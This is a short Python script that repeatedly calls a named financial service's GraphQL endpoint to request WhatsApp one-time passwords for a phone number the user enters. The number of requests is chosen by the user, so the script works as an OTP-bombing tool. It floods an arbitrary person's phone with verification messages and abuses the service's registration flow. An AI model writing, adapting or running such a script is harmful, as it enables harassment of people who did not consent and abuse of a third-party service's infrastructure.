import requests

url = 'https://edge.cermati.com/graphql'
headers = {
    'Content-Type': 'application/json',  # Add appropriate headers if needed
}

query = '''
    mutation RequestOtpByToken($input: RequestOtpByToken_Input!) {
        requestOtpByToken(input: $input) {
            ... on OtpRequest_Response {
                token
                remainingAttempts
            }
            ... on UnauthorizedError {
                errorCode
                errorMessage
                errorName
                maxAttempts
                isError
            }
            ... on ForbiddenError {
                errorCode
                errorMessage
                errorName
                existedValue
                remainingAttempts
                requireCaptcha
                identifierType
                isError
            }
            ... on ValidationError {
                errorCode
                errorMessage
                errorName
                isError
            }
            ... on TooManyRequestError {
                errorCode
                errorMessage
                errorName
                isError
                ttl
            }
            ... on LockedError {
                errorCode
                errorMessage
                errorName
                isError
                ttl
            }
            ... on NotFoundError {
                errorCode
                errorMessage
                errorName
                isError
                identifierType
            }
            ... on InternalServerError {
                errorCode
                errorMessage
                isError
            }
        }
    }
'''

# Input phone number and number of requests
phone_number = input("Enter phone number: ")
num_requests = int(input("Enter number of requests: "))

# Create request payload
variables = {
    'input': {
        'action': 'REGISTER',
        'identifier': phone_number,
        'method': 'whatsapp'
    }
}
payload = {
    'operationName': 'RequestOtpByToken',
    'variables': variables,
    'query': query
}

# Send requests as many times as specified
for _ in range(num_requests):
    # Send the request to the GraphQL endpoint
    response = requests.post(url, headers=headers, json=payload)

    # Check the HTTP status code
    if response.status_code == 200:
        # Retrieve data from the response
        data = response.json()
        otp_response = data['data']['requestOtpByToken']
        if 'token' in otp_response:
            token = otp_response['token']
            print("OTP Token:", token)
        elif 'errorMessage' in otp_response:
            error_message = otp_response['errorMessage']
            print("Failed to request OTP. Error message:", error_message)
    else:
        print("Failed to send GraphQL request. Status code:", response.status_code)
